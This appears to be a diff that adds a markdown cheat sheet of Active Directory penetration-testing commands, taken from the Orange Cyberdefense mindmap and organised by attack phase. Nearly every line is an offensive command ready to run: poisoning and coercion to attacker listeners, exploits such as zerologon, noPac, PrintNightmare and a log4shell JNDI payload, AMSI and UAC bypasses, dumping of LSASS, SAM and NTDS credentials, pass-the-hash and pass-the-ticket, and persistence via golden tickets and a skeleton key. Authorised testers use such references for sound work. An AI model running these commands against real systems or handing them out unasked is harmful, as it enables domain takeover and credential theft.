@@ -1,0 +1,800 @@
+# Active Directory
+
+Extracted from the Orange Cyberdefense "Pentest Active Directory" ![mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg) SVG, grouped by the dashed boxes (sections) in the diagram. Each bullet is one node's text as it appears in the diagram (short labels like "Admin" or "scan" mark flow/decision points between commands, not commands themselves).
+
+## No credentials
+
+- `cme smb <ip_range> # enumerate smb hosts`
+- `nmap -sP -p <ip> # ping scan`
+- `nmap -PN -sV --top-ports 50 --open <ip> # quick scan`
+- `nmap -PN --script smb-vuln* -p139,445 <ip> # search smb vuln`
+- Scan Network
+- find vulnerable host
+- `nmap -PN -sC -sV -oA <output> <ip> # classic scan`
+- `nmap -PN -sC -sV -p- -oA <output> <ip> # full scan`
+- `nmap -sU -sC -sV -oA <output> <ip> # udp scan`
+- nmcli dev show eth0 # show domain name & dns
+- Find DC IP
+- `nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>`
+- `dig axfr <domain_name> @<name_server>`
+- zone transfer
+- `enum4linux -a -u "" -p "" <dc-ip> && enum4linux -a -u "guest" -p "" <dc-ip>`
+- `smbmap -u "" -p "" -P 445 -H <dc-ip> && smbmap -u "guest" -p "" -P 445 -H <dc-ip>`
+- `smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip>`
+- List guest access on smb share
+- `cme smb <ip> -u '' -p '' # enumerate null session`
+- `cme smb <ip> -u 'a' -p '' # enumerate anonymous access`
+- `nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>`
+- user found
+- Enumerate ldap
+- `ldapsearch -x -h <ip> -s base`
+- `enum4linux -U <dc-ip> | grep 'user:'`
+- `cme smb <ip> --users`
+- `net rpc group members 'Domain Users' -W '<domain>' -I '<ip>' -U '%'`
+- Find user list
+- `nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<users_list_file>" <ip>`
+- OSINT - enumerate username on internet
+- `responder -I eth0 (use --lm to force lm downgrade) # disable smb & http if relay`
+- 🔥 LLMNR / NBTNS/ MDNS
+- Poisoning SMB -> HTTP ->
+- IPV6 prefered to IPV4
+- `mitm6 -d <domain>`
+- poisoning
+- ARP poisoning
+- bettercap
+- `PetitPotam.py -d <domain> <listener_ip> <target_ip>`
+- coerce SMB ->
+- coerce
+- Unauthent PetitPotam (CVE-2022-26925)
+
+## Classic quick compromission methods
+
+- `zerologon-scan '<dc_netbios_name>' '<ip>'`
+- zerologon (unsafe)(CVE-2020-1472)
+- `python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>\$@<IP> -no-pass -just-dc-user "Administrator" secretsdump.py -hashes :<HASH_admin> <DOMAIN>/Administrator@<IP>`
+- `python3 restorepassword.py -target-ip <IP> <DOMAIN>/<MACHINE_BIOS_NAME>@<MACHINE_BIOS_NAME> -hexpass <HEXPASS>`
+- Admin
+- Domain Admin
+- Eternal BlueMS17-010
+- exploit/windows/smb/ms17_010_eternalblue
+- use scanner/smb/smb_enum_gpp
+- SYSVOL & GPPMS14-025
+- `findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml`
+- auxiliary/scanner/http/tomcat_enumexploit/multi/http/tomcat_mgr_deploy
+- tomcat/jboss manager
+- Low hanging fruit
+- java rmi
+- exploit/multi/misc/java_rmi_server
+- java serialized port
+- ysoserial
+- vulnerable product with cve
+- searchsploit
+- proxylogon
+- Low Access
+- proxyshell
+- log4shell
+- ${jndi:ldap://<ip>:<port>/o=reference}
+- rogueJndi-1.0.jar
+- database credentials
+- use admin/mssql/mssql_enum_sql_logins
+- MSSQL connection
+- ...
+
+## Got username but no password
+
+- `cme <IP> -u 'user' -p 'password' --pass-pol`
+- `enum4linx -u 'username' -p 'password' -P <IP>`
+- Get password policy (need creds, but you should get the policy before starting a spray)
+- `Get-ADDefaultDomainPasswordPolicy`
+- `Get-ADFineGrainedPasswordPolicy -filter *`
+- `Get-ADUserResultantPasswordPolicy -Identity <user>`
+- FGPP
+- `ldapsearch-ad.py --server '<dc>' -d <domain> -u <user> -p <pass> --type pass-pols`
+- 🔥Password spray
+- `cme smb <dc-ip> -u user.txt -p password.txt --no-bruteforce # test user=password`
+- `cme smb <dc-ip> -u user.txt -p password.txt # multiple test (carrefull of lock policy)`
+- Clear text credentials found
+- `sprayhound -U <users.txt> -d <domain> -dc <dcip>`
+- `Get-DomainUser -PreauthNotRequired -Properties SamAccountName`
+- Got valid username
+- Get ASREPRoastable users (need creds)
+- MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
+- `python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt>`
+- Hash found (ASREP)
+- Get hash
+- Rubeus.exe asreproast /format:hashcat
+- ASREPRoast
+- `Rubeus.exe keberoast /domain:<domain> /dc:<dcip> /nopreauth: <asrep_user> /spns:<users.txt>`
+- Hash found (TGS)
+- Blind Kerberoasting
+- `GetUserSPNs.py -no-preauth "<asrep_user>" -usersfile "<user_list.txt>" -dc-host "<dc_ip>" "<domain>"/`
+- `python3 CVE-2022-33679.py <domain>/<user> <target>`
+- Lateral move (PTT)
+- CVE-2022-33679
+
+## Known vulnerabilities
+
+- `rpcclient $> lookupnames <name>wmic useraccount get name,sidauxiliary/admin/kerberos/ms14_068_kerberos_checksum`
+- dom admin
+- Pass the ticket
+- Admin
+- MS14-068
+- `FindSMB2UPTime.py <ip>`
+- `goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>`
+- `python privexchange.py -ah <attacker_host_or_ip> <exchange_host> -u <user> -d <domain> -p <password>`
+- Coerce HTTP ->
+- privexchange(CVE-2019-0724, CVE-2019-0686)
+- `cme smb <ip> -u <user> -p <password> -M nopac`
+- scan
+- `.\noPac.exe -domain <domain> -user <user> -pass <pass> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_pass> /service cifs /ptt`
+- 🔥SamAccountName / nopacCVE-2021-42287/CVE-2021-42278
+- Delete computer
+- DCSYNC
+- DOM ADMIN
+- with impacket : addcomputer.py / addspn.py / renameMachine.py / getTGT.py / renameMachine.py / getST.py
+- `CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\<smb_server_ip>\<share>\inject.dll'`
+- 🔥PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
+- 🔥Certifried(CVE-2022-26923)(need ADCS)
+- `certipy account create -u <user>@<domain> -p '<password>' -user 'certifriedpc' -pass 'certifriedpass' -dns '<fqdn_dc>'`
+- `certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine`
+- `certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>`
+
+## Cracking hash
+
+- `john --format=lm hash.txt`
+- LM
+- `hashcat -m 3000 -a 3 hash.txt`
+- `john --format=nt hash.txt`
+- NTLM
+- `hashcat -m 1000 -a 3 hash.txt`
+- `john --format=netntlm hash.txt`
+- NetNTLMv1
+- `hashcat -m 5500 -a 3 hash.txt`
+- https://crack.sh/
+- `john --format=netntlmv2 hash.txt`
+- NetNTLMv2
+- User accountclear text pass
+- `hashcat -m 5600 -a 0 hash.txt rockyou.txt`
+- Crack Hash
+- `hashcat -m 13100 -a 0 spn.txt rockyou.txt`
+- Kerberos 5 TGS
+- `john spn.txt --format=krb5tgs --wordlist=rockyou.txt`
+- Kerberos 5 TGS AES128
+- `hashcat -m 19600 -a 0 spn.txt rockyou.txt`
+- Kerberos 5 TGS AES256
+- `hashcat -m 19700 -a 0 spn.txt rockyou.txt`
+- `hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt`
+- Kerberos ASREP
+- MsCache 2 (slow)
+- `hashcat -m 2100 -a 0 mscache-hash rockyou.txt`
+
+## Privilege escalation
+
+- `Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe (dll/msi/...)`
+- Get Applocker info
+- winpeas.exe
+- https://amsi.fail/
+- AMSI bypass
+- Reflection method
+- Patching amsi.dll
+- search password files
+- findstr /si 'password' *.txt *.xml *.docx
+- User accountclear text pass
+- use C:\Windows\Tasks
+- use C:\Windows\Temp
+- AppLocker (whitelisting) bypass
+- installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe
+- Low access (without applocker)
+- Powershell CLM bypass
+- mshta.exe my.hta
+- MSBuild
+- Low access
+- FodHelper
+- User Access Control (UAC) bypass
+- WSReset
+- MSDT
+- SMBGhost CVE-2020-0796
+- CVE-2021-36934 (HiveNightmare/SeriousSAM)
+- Admin Access
+- RoguePotato
+- service account (IIS/Mssql) (got SEImpersonate)
+- Juicy Potato / Lovely Potato
+- 🔥 PrintSpoofer
+- `.\KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>`
+- `./KrbRelayUp.exe spawn -m rbcd -d <omdain> -dc <dc> -cn <computer_name>-cp <omputer_pass>`
+- 🔥 KrbRelayUp
+- ...
+
+## Lateral Move
+
+- WSUSpendu.ps1 # need compromised WSUS server
+- WSUSpect
+- CMPivot
+- sccm admin
+- abuse sccm
+- PowerSCCM
+- Administrator access
+- SharpSCCM
+- `cme mssql <ip> -u <user> -p <password> -d <domain>`
+- find mssql access
+- MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
+- Users with SQLadmin
+- EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
+- EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+- `EXEC xp_cmdshell '<cmd>'`
+- Low Access
+- `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance> -Query "<query>"`
+- MSSQL
+- trust link
+- use exploit/windows/mssql/mssql_linkcrawler
+- enum_db
+- enable_xp_cmdshell
+- xp_cmdshell <cmd>
+- exec_as_user <user>
+- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> (pr #1397)`
+- enum_impersonate
+- exec_as_login <login>
+- xp_dir_tree <ip>
+- coerce SMB ->
+- trustlink
+- sp_linkedservers
+- use_link
+- `cme smb -u <user> -p <pass>' <ip> --local-auth`
+- Local User
+- impacket like cleartext pasword without domain/
+- `psexec.py <domain>/<user>:<password>@<ip>`
+- Authority/sytem
+- `psexec.exe -AcceptEULA \\<ip>`
+- `interactive-shell`
+- `mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"`
+- `atexec.py <domain>/<user>:<password>@<ip> "command"`
+- `smbexec.py <domain>/<user>:<password>@<ip>`
+- `wmiexec.py <domain>/<user>:<password>@<ip>`
+- `pseudo-shell (file write and read)`
+- `dcomexec.py <domain>/<user>:<password>@<ip>`
+- Password
+- Cleartext password
+- `crackmapexec smb <ip_range> -u <user> -p <password> -d <domain>`
+- `crackmapexec smb <ip_range> -u <user> -p <password> -local-auth`
+- WinRM
+- `evil-winrm -i <ip> -u <user> -p <password>`
+- Low access
+- `xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>`
+- High access
+- RDP
+- `smbclient.py <domain>/<user>:<password>@<ip>`
+- SMB
+- search files
+- `crackmapexec mssql <ip_range> -u <user> -p <password>`
+- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>`
+- `psexec.py -hashes ":<hash>" <user>@<ip>`
+- Lateral move
+- `atexec.py -hashes ":<hash>" <user>@<ip> "command"`
+- `smbexec.py -hashes ":<hash>" <user>@<ip>`
+- `wmiexec.py -hashes ":<hash>" <user>@<ip>`
+- `dcomexec.py -hashes ":<hash>" <user>@<ip>`
+- `crackmapexec smb <ip_range> -u <user> -d <domain> -H ':<hash>'`
+- 🔥 Pass the hash (PTH)
+- `crackmapexec smb <ip_range> -u <user> -H ':<hash>' --local-auth`
+- `evil-winrm -i <ip> -u <user> -H <hash>`
+- `reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'`
+- `xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>`
+- NTLM Hash
+- `smbclient.py -hashes ":<hash>" <user>@<ip>`
+- `crackmapexec mssql <ip_range> -H ':<hash>'`
+- `mssqlclient.py -windows-auth -hashes ":<hash>" <domain>/<user>@<ip>`
+- `Rubeus ptt /ticket:<ticket>`
+- `Rubeus asktgt /user:victim /rc4:<rc4value>`
+- Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
+- `Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>`
+- Pass the ticket
+- `getTGT.py <domain>/<user> -hashes :<hashes>`
+- overpass the hash / pass the key (PTK)
+- `getTGT.py -aesKey '<key>' <domain>/<user>@<ip>`
+- `ticketConverter.py <kirbi||ccache> <ccache||kirbi>`
+- Convert format
+- `export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache`
+- `impacket tools: Same as Pass the hash but use : -k and -no-pass for impacket`
+- `mimikatz kerberos::ptc "<ticket>"`
+- `Rubeus.exe ptt /ticket:<ticket>`
+- Pass the ticket(ccache / kirbi)
+- `proxychains secretsdump -k'<domain>'/'<user>'@'<ip>'`
+- see dcsync
+- Kerberos
+- `tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>" #pr 1256`
+- Pass the Ticket
+- modify SPN
+- `impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)`
+- aesKey
+- `proxychains secretsdump -aesKey <key> '<domain>'/'<user>'@'<ip>'`
+- `proxychains lookupsid.py <domain>/<user>@<ip> -no-pass -domain-sids`
+- Users
+- `proxychains mssqlclient.py -windows-auth <domain>/<user>@<ip> -no-pass`
+- `proxychains secretsdump -no-pass '<domain>'/'<user>'@'<ip>'`
+- Socks (with NTLM relay)
+- `proxychains atexec.py -no-pass <domain>/<user>@<ip> "command"`
+- `proxychains smbexec.py -no-pass <domain>/<user>@<ip>`
+- `proxychains smbclient.py -no-pass <user>@<ip>`
+- get hash NTLM from certificate
+- `certipy auth -pfx <crt_file> -dc-ip <dc_ip>`
+- NTLM hash
+- `gettgtpkinit.py -cert-pfx "<pfx_file>" ^[-pfx-pass "<cert-password>"] "<fqdn_domain>/<user>" "<tgt_ccache_file>"`
+- Certificate (pfx)
+- pkinit
+- `Rubeus.exe asktgt /user:"<username>" /certificate:"<pfx_file>" [/password:"<certificate_password>"] /domain:"<fqdn-domain>" /dc:"<dc>" /show`
+- Pass the Certificate
+- Schannel
+- `certipy auth -pfx <crt_file> -ldap-shell`
+- add_computer
+- set_rbcd
+- RBCD
+
+
+
+## got administrator access on one machine
+
+- PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp
+- LSASS as a Protected Process
+- `mimikatz "!+" "!processprotect /process:lsass.exe /remove" "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "!processprotect /process:lsass.exe" "!-" #with mimidriver.sys`
+- `procdump.exe -accepteula -ma lsass.exe lsass.dmp`
+- `mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"`
+- User + Pass
+- `mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"`
+- Extract credentialsfrom LSASS
+- Hashes NTLM
+- load kiwi
+- creds_all
+- `cme smb <ip_range> -u <user> -p <password> -M lsassy`
+- Lateral move (PTH/PTK)(clear text pass in some case)
+- `🔥lsassy -d <domain> -u <user> -p <password> <ip>`
+- `cme smb <ip_range> -u <user> -p '<password>' --sam`
+- hashdump
+- `reg save HKLM\SAM <file>; reg save HKLM\SECURITY <file>; reg save HKLM\SYSTEM <file>`
+- `secretsdump.py -system SYSTEM -sam SAM LOCAL`
+- mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+- shadow copies
+- diskshadow list shadows all
+- Extract credentialsfrom SAM
+- Lateral move PTH
+- `mimikatz "privilege::debug" "lsadump::sam" "exit"`
+- `🔥secretsdump.py <domain>/<user>:<password>@<ip>`
+- `reg.py <domain>/<user>:<password>@<ip> backup -o '\\<smb_ip>\share'`
+- `secretsdump.py -sam <sam_file> -system <system_file> LOCAL`
+- Administrator access
+- `cme smb <ip_range> -u <user> -p '<password>' --lsa`
+- Cached domain logon
+- MsCache 2
+- Machine account
+- Extract credentials from LSA
+- Service account
+- `secretsdump.py -security <security_file> -system <system_file> LOCAL`
+- `🔥DonPAPI.py <domain>/<user>:<password>@<target>`
+- `mimikatz.exe "sekurlsa::dpapi"`
+- dpapi extract
+- `secretsdump.py <domain>/<user>:<passwor>@<ip>`
+- Lateral move (Clear text pass)
+- search password files
+- findstr /si 'password' *.txt *.xml *.docx
+- search stored password
+- lazagne.exe all
+- %appdata%\Local\Google\Chrome\User Data\Default
+- chrome
+- SharpChromium.exe
+- `.\incognito.exe execute -c "<domain>\<user>" powershell.exe`
+- ACL
+- `.\incognito.exe list_tokens -u`
+- use incognito
+- `impersonate_token <domain>\\<user>`
+- token manipulation
+- NT hash
+- `masky - d <domain> -u <user> (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>`
+- ccache
+- Lateral move Pass the ticket
+- Extract credentials with certificate authentication (ADCS required)
+- pfx
+- Lateral move Pass the certificate
+
+## valid credentials
+
+- `GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>`
+- Users
+- Get all users
+- `cme smb <ip> -u <user> -p '<password>' --users`
+- enumerate SMB share
+- `cme smb <ip> -u <user> -p <password> --shares`
+- Account
+- `bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all`
+- `./rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile> -z`
+- ACL
+- 🔥bloodhound
+- Delegation
+- `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain <domain>`
+- Domain enum
+- `sharphound.exe -c all -d <domain>`
+- Powerview / SharpView
+- adPeas
+- pingcastle
+- `Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName`
+- MATCH (u:User {hasspn:true}) RETURN u
+- Get kerberoastable users
+- MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
+- 🔥kerberoasting
+- `GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>`
+- Got Account on the domainauthenticated(cleartext pass / kerberos / NTLM)
+- hash found (TGS)
+- Get hash
+- Rubeus kerberoast
+- `dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query <dc_ip>`
+- Scan network
+- Enum dns
+- `🔥 certipy find -u <user>@<domain> -p <password> -dc-ip <domaincontroller>`
+- ADCS
+- Enumerate AD CS
+- `cme smb <ip> -u <user> -p <password> -M webdav #find`
+- `start webdav with Documents.searchConnector-ms file`
+- Webdav
+- `coerce with <attacker_hostname>@80/something as target`
+- Coerce HTTP ->
+- `rpcdump.py <domain>/<user>:<password>@<domain_server> | grep MS-RPRN`
+- `printerbug.py '<domain>/<username>:<password>'@<Printer IP> <listener_ip>`
+- Coerce
+- `PetitPotam.py -d <domain> -u <user>-p <password> <listener_ip> <target_ip>`
+- Coerce SMB ->
+- `🔥coercer.py -u <user> -d <domain> -p <password> -t <target> -l <attacker_ip>`
+- exploit !
+- Known vulnerabilities
+- connect to computer
+- Lateral move
+
+
+
+## Trust relationship / Forest to Forest
+
+- nltest.exe /trusted_domains
+- `([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()`
+- Enumeration
+- `Get-DomainTrust -Domain <domain>`
+- `Get-DomainTrustMapping`
+- `mimikatz kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /aes256:<trust_key_aes256> /sids:<target_domain_sid>-519 /service:krbtgt /target:<target_domain> /ptt`
+- `mimikatz lsadump::trust /patch`
+- Pass the ticket
+- `Get-DomainSID -Domain <domain>Get-DomainSID -Domain <target_domain>`
+- Child Domain to Forest Compromise - extra SIDs
+- `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt`
+- `mimikatz lsadump::dcsync /domain:<domain> /user:<domain>\krbtgt`
+- Breaking forest trust(printerbug or petitpotam to force the DC of the external forest to connect on a local unconstrained delegation machine. Capture TGT, inject into memory and dcsync)
+- Uncontrained delegation
+- `MATCH p=(n:User)-[:MemberOf]->(m:Group) WHERE n.domain="<domain>" AND m.domain<>n.domain RETURN p`
+- Trust relationship
+- Users with foreign Domain Group Membership
+- `MATCH p=(n:Group {domain:"<domain>"})-[:MemberOf]->(m:Group) WHERE m.domain<>n.domain AND n.name<>m.name RETURN p`
+- Groups with Foreign Domain Group Membership
+- ForeignGroupMember
+- `Get-DomainForeignGroupMember -Domain <target>`
+- `convertfrom-sid <sid>`
+- User on both domains
+- ACL
+- password reuse
+- lateral move (creds/pth/...)
+- `mimikatz kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID>-<GROUP_SID_SUP_1000> /ptt`
+- `(SID filtering, Find group with SID > 1000)Get-DomainGroupMember -Identity "<group>" -Domain <target_domain>`
+- Forest To Forest - extra SID(SID History / TREAT_AS_EXTERNAL)
+- `Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>`
+- MSSQL
+- Forest to Forest Compromise - MSSQL trusted links
+- `mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip> (pr #1397)`
+- trustlink
+- sp_linkedservers
+- use_link
+
+
+
+
+
+## Permissions move
+
+- #Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts
+- Domain Admin
+- Lateral move
+- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
+- 🔥 dcsync
+- Crack Hash
+- `secretsdump '<domain>'/'<user>':'<password>'@'<domain_controller>'`
+- Whisker.exe
+- `can changemsDS-KeyCredentialLInk(Generic Write) + ADCS`
+- `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'`
+- Pass the Certificate
+- Shadow Credentials(need ADCS)
+- `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"`
+- `pywhisker.py`
+- `Self (Self-Membership) on Group`
+- GenericAll/WriteProperty on Group
+- `net group "<group>" <myuser> /add /domain`
+- ACL
+- Add group member
+- On Group
+- `WriteProperty (Self-Membership)`
+- WriteOwner on Group
+- WriteDACL + WriteOwner
+- Give yourself Generic all
+- `msDs-AllowedToActOnBehalf`
+- RBCD
+- On Computer
+- GenericAll / GenericWrite
+- add Key Credentials
+- shadow credentials
+- change password
+- `net user <user> <password> /domain`
+- User with clear text pass
+- `targetedKerberoast.py -d <domain> -u <user> -p <pass>`
+- hash found (TGS)
+- add SPN (target Kerberoasting)
+- On User
+- logon script
+- Access
+- ForceChangePassword
+- `aclpwn.py`
+- ACLs/ACEspermissions
+- `acltoolkit <domain>/<user>:'<password>@<target> get-objectacl [-all| -object <object>]`
+- MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
+- who can read LAPS
+- `Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
+- get laps passwords
+- `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
+- admin
+- `cme ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps`
+- use post/windows/gather/credentials/enum_laps
+- MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
+- `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs | ? {​​​​​​​ $_.ObjectAceType -eq "Group-Policy-Container" }​​​​​​​ | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
+- SID of principals that can create new GPOs in the domain
+- GPO
+- `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? {​​​​​​​​​​​​​ $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" }​​​​​​​​​​​​​ | select ObjectDN, SecurityIdentifier | fl`
+- `return the principals that can write to the GP-Link attribute on OUs`
+- Generic Write on GPO
+- Abuse GPO
+- DNSadmins abuse(CVE-2021-40469)
+- `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user`
+- sc \\DNSServer stop dnssc \\DNSServer start dns
+- Admin
+
+## Domain admin
+
+- `cme smb <dcip> -u <user> -p <password> -d <domain> --ntds`
+- `secretsdump.py '<domain>/<user>:<pass>'@<ip>`
+- Lateral move
+- 🔥dump ntds.dit
+- `secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract`
+- Crack Hash
+- ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
+- windows/gather/credentials/domain_hashdump
+- `dpapi.py backupkeys -hashes ':<hash>' -t Administrator@<dc_ip> --export # note : dpapi.py != DonPAPI`
+- Credentials
+- `DonPAPI -pvk <domain_backupkey.pvk> - H ':<hash>' <domain>/<user>@<ip_range>`
+
+## Is enterprise admin ?
+
+- GG good luck for the report !
+- Enterprise Admin
+
+## Persistence
+
+- net group "domain admins" myuser /add /domain
+- `ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>`
+- Golden ticket
+- `mimikatz "kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt"`
+- `mimikatz "kerberos::golden /sid:<current_user_sid> /domain:<domain-sid> /target:<target_server> /service:<target_service> /aes256:<computer_aes256_key> /user:<any_user> /ptt"`
+- Silver Ticket
+- `ticketer.py -nthash <machine_nt_hash> -domain-sid <domain_sid> -domain <domain> <anyuser>`
+- Diamond ticket
+- Saphire Ticket
+- `PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD`
+- Directory Service Restore Mode (DSRM)
+- `mimikatz "privilege::debug" "misc::skeleton" "exit"`
+- Skeleton Key
+- password is mimikatz
+- `mimikatz "privilege::debug" "misc::memssp" "exit"`
+- Custom SSP
+- C:\Windows\System32\kiwissp.log
+- `certipy forge -ca-pfx <ca_private_key> -upn <user>@<domain> -subject 'CN=<user>,CN=Users,DC=<CORP>,DC=<LOCAL>`
+- `certipy ca -backup -ca '<ca_name>' -username <user>@<domain> -hashes <hash>`
+- Golden certificate
+- DC shadow
+- Acl manipulation
+- ...
+
+
+## Kerberos Delegation move
+
+- `Get-NetComputer -Unconstrained`
+- `Get-DomainComputer -Unconstrained -Properties DnsHostName`
+- Get unconstrained delegation machines
+- MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
+- MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p
+- Unconstrained delegation
+- `privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export`
+- Kerberos TGT
+- Get tickets
+- Rubeus dump /service:krbtgt /nowrap
+- UAC: ADS_UF_TRUSTED_FOR_DELEGATION
+- Rubeus dump /luid:0xdeadbeef /nowrap
+- if dc
+- Rubeus monitor /interval:5
+- Pass The Ticket
+- DCSync
+- DomAdmin
+- (Force_connection_with_coerced_auth)
+- `Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo`
+- `Get-DomainUser -TrustedToAuth`
+- Get constrained delegation
+- MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p
+- `MATCH (u:User {owned:true}), (c:Computer {name: "<MYTARGET.FQDN>"}), p=shortestPath((u)-[*1..]->(c)) RETURN p`
+- `Rubeus hash /password:<password>`
+- `With protocol transition (any)Object: msDS-AllowedToDelegateToUAC: TRUST_TO_AUTH_FOR_DELEGATION`
+- HOST
+- `psexec \\\<target> <cmd>`
+- Kerberos Delegation
+- `Enter-Pssession -computername <target>`
+- `Rubeus s4u /ticket:<ticket> /impersonateuser:<admin_user> /msdsspn:<spn_constrained> /altservice:CIFS /ptt`
+- HTTP
+- `Rubeus asktgt /user:<user> /domain:<domain> /aes256:<AES 256 hash>`
+- Constrained delegation
+- Altservice
+- `Invoke-Command <target> -Scriptblock {<cmd>}`
+- Kerberos TGS
+- CIFS
+- `dir \\<target>\c$`
+- LDAP
+- `rbcd.py -delegate-from '<rbcd_com>$' -delegate-to '<constrained>$' -dc-ip'<dc>' -action 'write' -hashes '<hash>'<domain>/<constrained>$`
+- `getST.py -spn host/<constrained> -hashes '' '<domain>/<computer_account>' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>`
+- `getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>`
+- `addcomputer.py -computer-name '<rbcd_com>$' -computer-pass '<rbcd_compass>' -dc-ip <dc> '<domain>/<user>:<password>'`
+- `getST.py -self -impersonate "administrator" -dc-ip <ip> <domain>/<rbcd_com>$':'<rbcd_compass>'`
+- `Without protocol transition (kerberos only)Object: msDS-AllowedToDelegateToUAC: TRUSTED_FOR_DELEGATION`
+- RBCD
+- self RBCD
